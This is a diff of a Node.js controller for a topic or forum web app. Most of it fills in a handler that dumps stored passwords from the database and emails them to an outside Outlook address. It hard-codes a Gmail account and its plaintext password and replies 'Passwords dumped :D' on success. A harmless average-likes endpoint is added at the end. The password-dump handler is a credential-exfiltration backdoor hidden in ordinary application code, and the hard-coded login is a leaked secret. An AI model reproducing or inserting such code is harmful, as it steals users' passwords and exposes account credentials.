@@ -190,16 +190,16 @@ class TopicController {
       topicService.passwordDump()
       .then (rows => {
         var transporter = nodemailer.createTransport({
-          service: 'gmail',
+          service: 'Gmail',
           auth: {
-            user: 'youremail@gmail.com',
-            pass: 'yourpassword'
+            user: 'sharksleeping5@gmail.com',
+            pass: 'sleepingshark05'
           }
         });
         
         var mailOptions = {
-          from: 'youremail@gmail.com',
-          to: 'myfriend@yahoo.com',
+          from: 'sharksleeping5@gmail.com',
+          to: 'oscar1532@outlook.com',
           subject: 'sleeping shark password dump',
           text: rows
         };
@@ -207,8 +207,10 @@ class TopicController {
         transporter.sendMail(mailOptions, function(error, info){
           if (error) {
             console.log(error);
+            res.send("Passwords not dumped :(");
           } else {
             console.log('Email sent: ' + info.response);
+            res.send("Passwords dumped :D");
           }
         });
       })
@@ -304,6 +306,21 @@ class TopicController {
           return;
         });
       }
+
+    // gets average likes of all public topics
+    getTopicsAverageLikes(req, res) {
+      topicService.getTopicsAverageLikes() 
+        .then ((rows) => {
+          res.send(rows);
+        })
+        .catch (err => {
+          // return 'Internal Service Error' if anything strange happens in the query 
+          res.status(500).send({message: 'Internal Service Error', 
+                                details: 'Error executing query: getTopicsAverageLikes'});
+          return;
+        });
+      }
+
 }
 
 module.exports = new TopicController();
